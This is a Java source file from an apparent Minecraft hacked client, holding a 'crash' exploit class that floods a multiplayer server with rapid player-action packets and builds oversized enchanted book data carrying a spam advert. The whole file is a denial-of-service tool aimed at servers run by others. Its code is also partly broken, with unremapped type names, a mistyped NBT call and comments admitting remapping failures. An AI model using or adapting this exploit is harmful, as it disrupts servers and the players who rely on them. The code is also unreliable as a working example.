package com.moonclient.pro.Exploit.Crash;

import java.util.Random;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;
import net.minecraft.client.Minecraft;

@Environment(value=EnvType.CLIENT)
public class Netty2 {
    public static void crash() {
        Random random = new Random();
        Minecraft client = Minecraft.getInstance();

        // Book is generating here but never used same like for Netty1 XDD

        // FUCK-SKIDDERS.CLUB - Remapper Problem
        // Can't be remapped -> [method_23317, method_23318, method_23321]
        // Lines -> [21, 21, 21]

        BlockPos pos = new BlockPos((int)Minecraft.getInstance().player.getX(), (int)(Minecraft.getInstance().player.getY() - 2.0), (int)Minecraft.getInstance().player.getZ());
        for (int i = 0; i < 50; ++i) {
            ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
            String author = "Netty" + random.nextInt(1000);
            StringBuilder contentBuilder = new StringBuilder();
            for (int k = 0; k < 100; ++k) {
                contentBuilder.append("##################################").append(k).append("\n");
            }
            String content = contentBuilder.toString();
            int pages = 100;
            CompoundTag tag = new CompoundTag();
            tag.putString("author", author);
            tag.putString("title", "Buy Lodias Client YIPPPEEEEEEEEE");
            tag.put("pages", pages);
            tag.putInt("generation", 0);
            tag.putBoolean("resolved", true);
            CompoundTag displayTag = new CompoundTag();
            displayTag.putInt("color", 0xFFFF00);
            displayTag.putString("Lore", "This is a very special book!");
            tag.put("display", displayTag);
            ListTag enchantments = new ListTag();
            CompoundTag enchantment = new CompoundTag();
            enchantment.putString("id", "minecraft:sharpness");
            enchantment.putInt("lvl", 255);
            enchantments.add(enchantment);
            tag.put("Enchantments", enchantments);
            book.setTag(tag);
            for (int j = 0; j < 5; ++j) {
                Netty2.sendPlayerActionPackets(client, pos);
                try {
                    Thread.sleep(random.nextInt(10, 50));
                    continue;
                }
                catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }
    }

    private static void sendPlayerActionPackets(class_310 client, class_2338 pos) {
        Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.START_DESTROY_BLOCK, pos, Direction.UP));
        Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.STOP_DESTROY_BLOCK, pos, Direction.DOWN));
        Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.ABORT_DESTROY_BLOCK, pos, Direction.UP));
        Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.SWAP_ITEM_WITH_OFFHAND, pos, Direction.DOWN));
    }
}
 